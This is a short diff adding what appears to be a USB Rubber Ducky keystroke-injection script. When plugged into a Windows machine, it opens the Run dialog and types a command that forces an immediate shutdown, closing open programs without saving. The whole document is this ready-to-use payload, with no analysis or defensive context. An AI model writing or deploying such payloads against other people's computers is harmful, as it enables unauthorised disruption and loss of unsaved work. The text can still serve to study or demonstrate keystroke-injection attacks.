@@ -1,0 +1,5 @@
+WINDOWS r
+DELAY 100
+STRING shutdown /s /f /t 0
+DELAY 100
+ENTER
